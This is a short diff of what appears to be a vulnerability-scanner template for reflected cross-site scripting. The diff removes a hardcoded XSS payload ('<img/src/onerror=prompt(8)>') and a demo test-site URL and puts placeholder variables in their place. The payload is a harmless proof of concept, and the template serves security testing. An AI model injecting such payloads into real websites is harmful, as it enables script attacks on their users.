@@ -8,11 +8,11 @@ requests:
   - part: body
     type: word
     words:
-    - <img/src/onerror=prompt(8)>
+    - '{{payload}}'
   - status:
     - 200
     type: status
   matchers-condition: and
   method: GET
   path:
-  - http://testphp.vulnweb.com/listproducts.php?cat=<img/src/onerror=prompt(8)>
+  - '{{target}}'
